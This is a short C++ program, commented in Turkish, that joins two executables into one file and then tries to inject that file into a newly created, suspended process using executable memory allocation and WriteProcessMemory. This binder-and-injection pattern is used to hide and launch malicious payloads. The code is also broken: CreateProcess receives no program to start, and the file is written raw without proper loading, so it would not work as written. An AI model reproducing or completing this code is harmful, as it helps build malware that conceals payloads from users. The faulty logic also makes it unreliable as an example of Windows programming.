#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main()
{
    // İlk exe dosyasını oku
    ifstream input1("s1.exe", ios::binary | ios::ate);
    streamsize size1 = input1.tellg();
    input1.seekg(0, ios::beg);
    char* buffer1 = new char[size1];
    input1.read(buffer1, size1);

    // İkinci exe dosyasını oku
    ifstream input2("s2.exe", ios::binary | ios::ate);
    streamsize size2 = input2.tellg();
    input2.seekg(0, ios::beg);
    char* buffer2 = new char[size2];
    input2.read(buffer2, size2);

    // Yeni exe dosyasını oluştur ve ilk ve ikinci bölümleri yaz
    ofstream output("ebs.exe", ios::binary);
    output.write(buffer1, size1);
    output.write(buffer2, size2);

    // Bellekleri serbest bırak
    delete[] buffer1;
    delete[] buffer2;

    // Birleştirilmiş exe dosyasını oku
    ifstream input("ebs.exe", ios::binary | ios::ate);
    streamsize size = input.tellg();
    input.seekg(0, ios::beg);
    BYTE* buffer = new BYTE[size];
    input.read(reinterpret_cast<char*>(buffer), size);

    // CreateProcess için gerekli parametreler
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Parametreleri sıfırla
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Yeni process başlat
    if (!CreateProcess(NULL,   // Uygulama adı
        NULL,                  // Komut satırı parametreleri
        NULL,                  // Process handle'ı
        NULL,                  // Thread handle'ı
        FALSE,                 // Çalıştırma modu
        CREATE_SUSPENDED,      // Suspended modda çalıştır
        NULL,                  // Yeni bir environment block kullanma
        NULL,                  // Çalışma dizini
        &si,                   // StartupINFO yapısı
        &pi))                  // ProcessINFO yapısı
    {
        cout << "CreateProcess failed (" << GetLastError() << ")" << endl;
        return 1;
    }

    // Process bellek alanına yaz
    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL)
    {
        cout << "VirtualAllocEx failed (" << GetLastError() << ")" << endl;
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, buffer, size, NULL))
    {
        cout << "WriteProcessMemory failed (" << GetLastError() << ")" << endl;
        return 1;
    }

    // Yeni process'i çalıştır
    if (ResumeThread(pi.hThread) == -1)
    {
        cout << "ResumeThread failed (" << GetLastError() << ")" << endl;
        return 1;
    }

    // Bellekleri serbest bırak
    delete[] buffer;

    // Handle'ları serbest bırak
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
    return 0;
}
